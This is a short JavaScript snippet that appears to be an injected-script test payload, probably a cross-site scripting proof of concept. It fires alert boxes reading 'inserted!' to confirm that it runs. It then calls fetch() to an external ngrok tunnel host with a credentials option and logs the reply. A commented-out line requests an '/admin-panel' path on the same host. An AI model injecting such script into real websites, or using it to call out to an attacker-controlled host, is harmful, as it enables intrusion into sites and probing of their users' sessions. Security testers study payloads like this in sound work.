document.onload = () => alert('inserted!');

alert('inserted any way!');

fetch('https://ad68d9ca.ngrok.io/',{ credentials: "same-origin"}).then(data => console.log(data))
  .catch(error => console.error(error)); 

// $.get('https://ad68d9ca.ngrok.io/admin-panel').done(data => console.log(data));